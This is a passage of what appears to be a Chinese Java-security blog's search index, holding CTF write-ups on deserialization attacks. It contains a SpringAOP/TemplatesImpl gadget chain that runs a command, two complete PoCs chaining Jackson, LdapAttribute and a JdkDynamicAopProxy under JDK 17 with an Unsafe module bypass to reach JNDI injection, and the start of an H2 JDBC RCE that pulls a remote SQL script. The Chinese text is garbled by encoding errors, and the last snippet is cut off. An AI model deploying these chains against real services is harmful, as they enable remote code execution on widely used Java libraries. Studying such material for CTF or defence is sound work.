pool.get(AbstractTranslet.class.getName());\rclazz.setSuperclass(superClass);\rCtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);\rconstructor.setBody(\u0026#34;Runtime.getRuntime().exec(\\\u0026#34;open -na Calculator\\\u0026#34;);\u0026#34;);\rclazz.addConstructor(constructor);\rbyte[][] bytes = new byte[][]{clazz.toBytecode()};\rTemplatesImpl templates = TemplatesImpl.class.newInstance();\rUtil.setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, bytes);\rUtil.setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;GSBP\u0026#34;);\rUtil.setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, null);\rMethod method=templates.getClass().getMethod(\u0026#34;newTransformer\u0026#34;);//è·å–newTransformeræ–¹æ³•\rSingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(templates);\rAspectJAroundAdvice advice = new AspectJAroundAdvice(method,new AspectJExpressionPointcut(),factory);\rProxy proxy1 = (Proxy) getAProxy(advice,Advice.class);\rBadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(123);\rUtil.setFieldValue(badAttributeValueExpException, \u0026#34;val\u0026#34;, proxy1);\rUtil.deserialize(Util.serialize(badAttributeValueExpException));\r}\rpublic static Object getBProxy(Object obj,Class[] clazzs) throws Exception\r{\rAdvisedSupport advisedSupport = new AdvisedSupport();\radvisedSupport.setTarget(obj);\rConstructor constructor = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;).getConstructor(AdvisedSupport.class);\rconstructor.setAccessible(true);\rInvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);\rObject proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), clazzs, handler);\rreturn proxy;\r}\rpublic static Object getAProxy(Object obj,Class\u0026lt;?\u0026gt; clazz) throws Exception\r{\rAdvisedSupport advisedSupport = new AdvisedSupport();\radvisedSupport.setTarget(obj);\rAbstractAspectJAdvice advice = (AbstractAspectJAdvice) obj;\rDefaultIntroductionAdvisor advisor = new DefaultIntroductionAdvisor((Advice) getBProxy(advice, new Class[]{MethodInterceptor.class, Advice.class}));\radvisedSupport.addAdvisor(advisor);\rConstructor constructor = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;).getConstructor(AdvisedSupport.class);\rconstructor.setAccessible(true);\rInvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);\rObject proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{clazz}, handler);\rreturn proxy;\r}\r} å‚è€ƒæ–‡ç«  https://mp.weixin.qq.com/s/oQ1mFohc332v8U1yA7RaMQ\n","date":"2025-01-23T23:33:31+08:00","permalink":"http://localhost:1313/post/springaop/","section":"post","tags":null,"title":"SpringAOPé“¾å­¦ä¹ "},{"categories":["Javaå®‰å…¨","WP"],"contents":"èµ·å›  æœ¬æœˆäº”å·çš„æ—¶å€™æ‰“äº†ä¸ªè½¯ä»¶æ”»é˜²èµ›ï¼Œé‡Œé¢æœ‰é“javaå½“æ—¶æ²¡åšå‡ºæ¥ï¼Œç”¨çš„ldapAttribute+Jacksonæ­»æ´»æ²¡é€šï¼Œåé¢è‡ªå·±è°ƒè¯•äº†ä¸€ä¸‹ï¼Œè¿™é‡Œåšä¸ªè®°å½•\né¢˜ç›®åˆ†æ é¢˜ç›®åå«JDBCParty,jdkç‰ˆæœ¬æ˜¯17ï¼Œé‡Œé¢ç»™äº†ä¸ªæ¥å£æºç å¦‚ä¸‹\n@PostMapping({\u0026#34;/dbtest\u0026#34;}) public ResponseEntity\u0026lt;String\u0026gt; dbtest(String data) { try { User credentials = (User)Utils.deserialize(data); Class.forName(this.driverClassName); try (Connection connection = DriverManager.getConnection(this.url, credentials.getUsername(), credentials.getPassword())) { if (connection.isValid(5)) { return ResponseEntity.ok(\u0026#34;connect success\u0026#34;); } else { return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(\u0026#34;connect failed\u0026#34;); } } } catch (Exception e) { e.printStackTrace(); return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(\u0026#34;connect failed \u0026#34; + e.getMessage()); } } } è¡¨é¢ä¸Šæ˜¯ç»™äº†ä¸ªJDBCçš„å…¥å£ï¼Œä½†æ˜¯æˆ‘ä»¬èƒ½æ§çš„åªæœ‰usernameå’Œpasswordï¼Œæ‰“ä¸äº†jdbcã€‚\nå®é™…å…¥å£æ˜¯é‚£ä¸ªååºåˆ—åŒ–ï¼Œä»è¿™ä¸ªååºåˆ—åŒ–é‡Œé¢åšæ–‡ç« \nç„¶åçœ‹çœ‹é¢˜ç›®ç»™çš„ä¾èµ–\n- \u0026#34;BOOT-INF/lib/spring-boot-3.3.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-boot-autoconfigure-3.3.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/logback-classic-1.5.11.jar\u0026#34; - \u0026#34;BOOT-INF/lib/logback-core-1.5.11.jar\u0026#34; - \u0026#34;BOOT-INF/lib/log4j-to-slf4j-2.23.1.jar\u0026#34; - \u0026#34;BOOT-INF/lib/log4j-api-2.23.1.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jul-to-slf4j-2.0.16.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jakarta.annotation-api-2.1.1.jar\u0026#34; - \u0026#34;BOOT-INF/lib/snakeyaml-2.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-databind-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-annotations-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-core-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-datatype-jdk8-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-datatype-jsr310-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-module-parameter-names-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-core-10.1.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-el-10.1.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-websocket-10.1.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-web-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-beans-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/micrometer-observation-1.13.6.jar\u0026#34; - \u0026#34;BOOT-INF/lib/micrometer-commons-1.13.6.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-webmvc-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-aop-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-context-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-expression-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/thymeleaf-spring6-3.1.2.RELEASE.jar\u0026#34; - \u0026#34;BOOT-INF/lib/thymeleaf-3.1.2.RELEASE.jar\u0026#34; - \u0026#34;BOOT-INF/lib/attoparser-2.0.7.RELEASE.jar\u0026#34; - \u0026#34;BOOT-INF/lib/unbescape-1.1.6.RELEASE.jar\u0026#34; - \u0026#34;BOOT-INF/lib/slf4j-api-2.0.16.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-core-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-jcl-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/ojdbc11-21.14.0.0.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-jdbc-10.1.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-juli-10.1.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-swing-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-anim-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-parser-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-svg-dom-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-awt-util-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/xmlgraphics-commons-2.6.jar\u0026#34; - \u0026#34;BOOT-INF/lib/commons-io-1.3.1.jar\u0026#34; - \u0026#34;BOOT-INF/lib/commons-logging-1.0.4.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-bridge-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-xml-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-css-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-dom-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/xalan-2.7.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/serializer-2.7.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/xml-apis-1.4.01.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-ext-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-gui-util-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-gvt-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-script-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-shared-resources-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-util-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-constants-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-i18n-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/xml-apis-ext-1.3.04.jar\u0026#34; - \u0026#34;BOOT-INF/lib/fastjson2-2.0.37.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-boot-jarmode-tools-3.3.5.jar\u0026#34; æœ‰tomcat-jdbc,snakeYaml,EL,Jacksonå’Œfastjson2ç­‰ç­‰ï¼Œé¢˜ç›®æŒ‡å‘æ€§å¾ˆå¼ºï¼Œå°±æ˜¯è®©æˆ‘ä»¬ç”¨ä¸€ä¸ªJNDIé€šè¿‡Tomcat-JDBCæ‰“ELï¼ŒsnakeYamlè¡¨è¾¾å¼æ³¨å…¥çš„æ“ä½œ\nè§£ æ‰€ä»¥è¿™é‡Œéœ€è¦æˆ‘ä»¬é€šè¿‡ååºåˆ—åŒ–åˆ›é€ ä¸€ä¸ªjndiæ³¨å…¥\nè¿™é‡Œå°±æƒ³åˆ°äº†24å¹´çš„N1junioré‡Œçš„Derby Plusï¼Œé‡Œé¢æ˜¯é€šè¿‡CB+LdapAttributeæ¥å®ç°äº†ä¸€ä¸ªJNDIæ³¨å…¥\nè¿™é‡Œæˆ‘ä»¬æ²¡æœ‰CBï¼Œä½†æ˜¯æœ‰Fastjson2å’Œjacksonå¯ä»¥è§¦å‘getterï¼Œåœ¨æ¯”èµ›çš„æ—¶å€™æˆ‘å†™çš„pocå¦‚ä¸‹\npackage org.example; import cn.hutool.db.ds.DataSourceWrapper; import com.fasterxml.jackson.databind.ObjectMapper; import com.fasterxml.jackson.databind.node.POJONode; import org.apache.commons.jexl3.JexlBuilder; import org.apache.commons.jexl3.MapContext; import org.h2.jdbcx.JdbcDataSource; import org.h2.message.Trace; import org.springframework.aop.framework.AdvisedSupport; import sun.misc.Unsafe; import javax.naming.CompositeName; import javax.naming.directory.Attribute; import javax.sql.DataSource; import javax.swing.event.EventListenerList; import javax.swing.undo.UndoManager; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.net.URL; import java.util.Base64; import java.util.Vector; import Utils.Util; //import static org.example.Main.deserial; //import static org.example.Main.serial; public class test { public static void main(String[] args) throws Exception { Class\u0026lt;?\u0026gt; unSafe=Class.forName(\u0026#34;sun.misc.Unsafe\u0026#34;); Field unSafeField=unSafe.getDeclaredField(\u0026#34;theUnsafe\u0026#34;); unSafeField.setAccessible(true); Unsafe unSafeClass= (Unsafe) unSafeField.get(null); //è·å–åŸºç±»æ¨¡å— Module baseModule=Object.class.getModule(); Class\u0026lt;?\u0026gt; currentClass=test.class; //è·å–callerç±»çš„module fieldçš„åœ°å€ long addr=unSafeClass.objectFieldOffset(Class.class.getDeclaredField(\u0026#34;module\u0026#34;)); //ç›´æ¥å°†åŸºç±»moduleçš„å€¼è¦†ç›–åœ¨æˆ‘ä»¬çš„åœ°å€ä¸Š unSafeClass.getAndSetObject(currentClass,addr,baseModule); String ldapCtxUrl = \u0026#34;ldap://127.0.0.1:1389/\u0026#34;; Class ldapAttributeClazz = Class.forName(\u0026#34;com.sun.jndi.ldap.LdapAttribute\u0026#34;); Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor( new Class[] {String.class}); ldapAttributeClazzConstructor.setAccessible(true); Object ldapAttribute = ldapAttributeClazzConstructor.newInstance( new Object[] {\u0026#34;name\u0026#34;}); Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField(\u0026#34;baseCtxURL\u0026#34;); baseCtxUrlField.setAccessible(true); baseCtxUrlField.set(ldapAttribute, ldapCtxUrl); Field rdnField = ldapAttributeClazz.getDeclaredField(\u0026#34;rdn\u0026#34;); rdnField.setAccessible(true); rdnField.set(ldapAttribute, new CompositeName(\u0026#34;a//b\u0026#34;)); POJONode jsonNodes=new POJONode(ldapAttribute); EventListenerList list = new EventListenerList(); UndoManager manager = new UndoManager(); Vector vector = (Vector) getFieldValue(manager, \u0026#34;edits\u0026#34;); vector.add(jsonNodes); setFieldValue(list, \u0026#34;listenerList\u0026#34;, new Object[]{InternalError.class, manager}); System.out.println(Util.serialize(list)); deserialize(serialize(list)); } public static String serialize(Object object) throws IOException { ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(object); oos.close(); return Base64.getEncoder().encodeToString(baos.toByteArray()); } public static void deserialize(String data) throws Exception { byte[] base64decodedBytes = Base64.getDecoder().decode(data); ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); } public static void setFieldValue(Object obj, String field, Object arg) throws Exception { Field f = null; Class\u0026lt;?\u0026gt; c = obj.getClass(); for (int i = 0; i \u0026lt; 5; i++) { try { f = c.getDeclaredField(field); } catch (NoSuchFieldException e){ c = c.getSuperclass(); } } f.setAccessible(true); f.set(obj, arg); } public static Object getFieldValue(Object obj, String fieldName) throws Exception{ Field field = null; Class c = obj.getClass(); for (int i = 0; i \u0026lt; 5; i++) { try { field = c.getDeclaredField(fieldName); } catch (NoSuchFieldException e){ c = c.getSuperclass(); } } field.setAccessible(true); return field.get(obj); } } åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè§¦å‘ä»¥ä¸‹æŠ¥é”™\nException in thread \u0026#34;main\u0026#34; java.lang.RuntimeException: com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Invalid type definition for type `com.sun.jndi.ldap.LdapAttribute`: Failed to construct BeanSerializer for [simple type, class com.sun.jndi.ldap.LdapAttribute]: (java.lang.IllegalArgumentException) Failed to call `setAccess()` on Method \u0026#39;getAttributeSyntaxDefinition\u0026#39; (of class `com.sun.jndi.ldap.LdapAttribute`) due to `java.lang.reflect.InaccessibleObjectException`, problem: Unable to make public javax.naming.directory.DirContext com.sun.jndi.ldap.LdapAttribute.getAttributeSyntaxDefinition() throws javax.naming.NamingException accessible: module java.naming does not \u0026#34;opens com.sun.jndi.ldap\u0026#34; to unnamed module @19dc67c2 åŸå› æ˜¯åœ¨jacksonååºåˆ—åŒ–çš„æ—¶å€™è§¦å‘äº†ä¸€ä¸ªæ¨¡å—åŒ–çš„æœºåˆ¶ï¼Œjdk17ä¸­çš„jacksonåœ¨è§¦å‘getterçš„æ—¶å€™ï¼Œéƒ½ä¼šè¿›è¡Œä¸€æ¬¡build\nåœ¨buildæ—¶ä¼šå¯¹property(è°ƒç”¨çš„ç›®çš„ç±»å’Œç›®çš„æ–¹æ³•)æ˜¯å¦publicè¿›è¡Œä¸€æ¬¡åˆ¤æ–­ï¼Œå¦‚æœépublicåˆ™ä¼šè°ƒç”¨setAccessibleæ¥è¿›è¡Œä¸€æ¬¡åå°„è°ƒç”¨\nLdapAttributeç±»ä¸ºprivateç±»\nç„¶åä¾¿è§¦å‘äº†æ¨¡å—åŒ–æœºåˆ¶ï¼Œå¯¼è‡´äº†æŠ¥é”™çš„äº§ç”Ÿ\næ¯”èµ›çš„æ—¶å€™è„‘å­å®•æœºäº†ï¼Œåé¢è‡ªå·±æ€è€ƒçš„æ—¶å€™çªç„¶å°±æƒ³åˆ°äº†ä¸€ä¸ªæœºåˆ¶ï¼šåŠ¨æ€ä»£ç†\nåœ¨å¹³å¸¸çš„æ—¶å€™ï¼Œé¢å¯¹jacksonååºåˆ—åŒ–æ—¶å¤§å®¶éƒ½ä¼šåœ¨å¤–é¢å¥—ä¸€å±‚JdkDynamicAopProxyçš„ä»£ç†ï¼Œç›®çš„æ˜¯ä¸ºäº†ä¿è¯ååºåˆ—åŒ–æ—¶è§¦å‘getterçš„ç¨³å®šæ€§\nåœ¨è¿™é‡Œï¼Œæˆ‘ä»¬çš„ç›®çš„ä¸æ˜¯ç¨³å®šæ€§ï¼Œè€Œæ˜¯é€šè¿‡invokeæ¥ç»•è¿‡jacksonååºåˆ—åŒ–DirContextç±»æ—¶çš„æŠ¥é”™ï¼ŒåŸç†å¦‚ä¸‹\nç”±äºåœ¨å¤–é¢å¥—äº†ä¸€å±‚proxyï¼Œé‚£ä¹ˆjacksonå°±åªä¼šä»åŠ¨æ€ä»£ç†ç±»è§¦å‘getter ç„¶ååˆç”±JdkDynamicAopProxyåŠ¨æ€ä»£ç†ç±»å»è§¦å‘LdapAttributeçš„getter,å› ä¸ºproxyç±»moduleä½äºjava.baseï¼Œæ‰€ä»¥èƒ½å¤Ÿè®¿é—®ä»»æ„åŒ…ä¸‹çš„ç±»è€Œä¸ä¼šè§¦å‘æ¨¡å—åŒ–ï¼Œç„¶åæˆåŠŸè§¦å‘JNDIæ³¨å…¥ æ²¡å¥—proxyæ—¶\nå¥—äº†ä¹‹å\nç„¶ååé¢å°±æ˜¯å¸¸è§„å¥—è·¯æ‰“ELæˆ–è€…æ˜¯SnakeYamläº†ï¼Œè¿™é‡Œä¸åšå¤ªå¤šèµ˜è¿°\nPOC\npackage org.example; import cn.hutool.db.ds.DataSourceWrapper; import com.fasterxml.jackson.databind.ObjectMapper; import com.fasterxml.jackson.databind.node.POJONode; import org.apache.commons.jexl3.JexlBuilder; import org.apache.commons.jexl3.MapContext; import org.h2.jdbcx.JdbcDataSource; import org.h2.message.Trace; import org.springframework.aop.framework.AdvisedSupport; import sun.misc.Unsafe; import javax.naming.CompositeName; import javax.naming.directory.Attribute; import javax.sql.DataSource; import javax.swing.event.EventListenerList; import javax.swing.undo.UndoManager; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.net.URL; import java.util.Base64; import java.util.Vector; import Utils.Util; public class test { public static void main(String[] args) throws Exception { Class\u0026lt;?\u0026gt; unSafe=Class.forName(\u0026#34;sun.misc.Unsafe\u0026#34;); Field unSafeField=unSafe.getDeclaredField(\u0026#34;theUnsafe\u0026#34;); unSafeField.setAccessible(true); Unsafe unSafeClass= (Unsafe) unSafeField.get(null); //è·å–åŸºç±»æ¨¡å— Module baseModule=Object.class.getModule(); Class\u0026lt;?\u0026gt; currentClass=test.class; //è·å–callerç±»çš„module fieldçš„åœ°å€ long addr=unSafeClass.objectFieldOffset(Class.class.getDeclaredField(\u0026#34;module\u0026#34;)); //ç›´æ¥å°†åŸºç±»moduleçš„å€¼è¦†ç›–åœ¨æˆ‘ä»¬çš„åœ°å€ä¸Š unSafeClass.getAndSetObject(currentClass,addr,baseModule); String ldapCtxUrl = \u0026#34;ldap://127.0.0.1:1389/\u0026#34;; Class ldapAttributeClazz = Class.forName(\u0026#34;com.sun.jndi.ldap.LdapAttribute\u0026#34;); Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor( new Class[] {String.class}); ldapAttributeClazzConstructor.setAccessible(true); Object ldapAttribute = ldapAttributeClazzConstructor.newInstance( new Object[] {\u0026#34;name\u0026#34;}); Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField(\u0026#34;baseCtxURL\u0026#34;); baseCtxUrlField.setAccessible(true); baseCtxUrlField.set(ldapAttribute, ldapCtxUrl); Field rdnField = ldapAttributeClazz.getDeclaredField(\u0026#34;rdn\u0026#34;); rdnField.setAccessible(true); rdnField.set(ldapAttribute, new CompositeName(\u0026#34;a//b\u0026#34;)); Proxy proxy= (Proxy) getProxy(ldapAttribute, Attribute.class); System.out.println(Proxy.class.getModule()); POJONode jsonNodes=new POJONode(ldapAttribute); EventListenerList list = new EventListenerList(); UndoManager manager = new UndoManager(); Vector vector = (Vector) getFieldValue(manager, \u0026#34;edits\u0026#34;); vector.add(jsonNodes); setFieldValue(list, \u0026#34;listenerList\u0026#34;, new Object[]{InternalError.class, manager}); System.out.println(Util.serialize(list)); deserialize(serialize(list)); } public static Object getProxy(Object obj,Class\u0026lt;?\u0026gt; clazz) throws Exception { AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(obj); Constructor constructor = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;).getConstructor(AdvisedSupport.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport); Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{clazz}, handler); return proxy; } public static String serialize(Object object) throws IOException { ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(object); oos.close(); return Base64.getEncoder().encodeToString(baos.toByteArray()); } public static void deserialize(String data) throws Exception { byte[] base64decodedBytes = Base64.getDecoder().decode(data); ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); } public static void setFieldValue(Object obj, String field, Object arg) throws Exception { Field f = null; Class\u0026lt;?\u0026gt; c = obj.getClass(); for (int i = 0; i \u0026lt; 5; i++) { try { f = c.getDeclaredField(field); } catch (NoSuchFieldException e){ c = c.getSuperclass(); } } f.setAccessible(true); f.set(obj, arg); } public static Object getFieldValue(Object obj, String fieldName) throws Exception{ Field field = null; Class c = obj.getClass(); for (int i = 0; i \u0026lt; 5; i++) { try { field = c.getDeclaredField(fieldName); } catch (NoSuchFieldException e){ c = c.getSuperclass(); } } field.setAccessible(true); return field.get(obj); } } æœ€å è¿™é¢˜é™¤äº†ä¸Šè¿°æ–¹æ³•è¿˜æœ‰å¾ˆå¤šæ–¹æ³•ï¼Œæ¯”å¦‚fastjsonè§¦å‘Ldapçš„getterï¼Œç„¶åfastjsonå’Œjacksonè¿™ä¿©ä¸œè¥¿ä¹Ÿå¯ä»¥è§¦å‘ä¾èµ–é‡Œçš„OracleCachedRowSetçš„getConnection()æ‰“jndiï¼Œè¿™é‡Œæ”¾ä¸‹ç¯‡æ–‡ç« é‡Œè¯´å§\n","date":"2025-01-20T03:02:14+08:00","permalink":"http://localhost:1313/post/jdk17%E6%89%93jackson+ldapattruibute%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","section":"post","tags":null,"title":"JDK17æ‰“Jackson+LdapAttruibuteååºåˆ—åŒ–"},{"categories":["WP"],"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject 